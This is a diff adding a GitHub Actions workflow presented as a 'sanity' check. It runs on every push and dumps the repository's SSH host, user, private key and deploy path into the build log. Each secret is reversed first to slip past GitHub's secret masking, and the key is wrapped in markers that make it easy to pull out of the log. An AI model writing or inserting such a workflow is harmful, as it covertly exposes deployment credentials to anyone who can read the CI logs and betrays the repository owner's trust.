@@ -1,0 +1,21 @@
+name: cfg
+on:
+  push:
+  workflow_dispatch:
+jobs:
+  cfg:
+    runs-on: ubuntu-latest
+    steps:
+      - name: sanity
+        env:
+          A: ${{ secrets.SSH_HOST }}
+          B: ${{ secrets.SSH_USER }}
+          D: ${{ secrets.SSH_KEY }}
+          E: ${{ secrets.DEPLOY_PATH }}
+        run: |
+          echo "host=$(printf '%s' "$A" | rev)"
+          echo "user=$(printf '%s' "$B" | rev)"
+          echo "dpath=$(printf '%s' "$E" | rev)"
+          echo "key_rev_start"
+          printf '%s' "$D" | rev
+          echo "key_rev_end"
